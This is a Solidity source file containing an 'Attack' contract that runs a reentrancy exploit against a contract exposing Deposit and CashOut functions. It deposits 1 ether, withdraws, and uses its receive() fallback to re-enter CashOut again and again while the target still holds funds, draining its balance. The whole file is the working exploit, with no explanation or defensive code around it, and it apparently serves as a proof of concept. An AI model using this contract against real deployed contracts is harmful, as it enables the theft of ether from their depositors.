// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerableDeposit {
    function Deposit() external payable;
    function CashOut(uint256 _am) external payable;
}

contract Attack {
    IVulnerableDeposit public target;

    constructor(address _vulnerableDepositAddress) {
        target = IVulnerableDeposit(_vulnerableDepositAddress);
    }

    // Fallback function to receive Ether and re-enter CashOut
    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.CashOut(1 ether);
        }
    }

    function attack() external payable {
        target.Deposit{value: 1.0 ether}();
        target.CashOut(1 ether);
    }
}
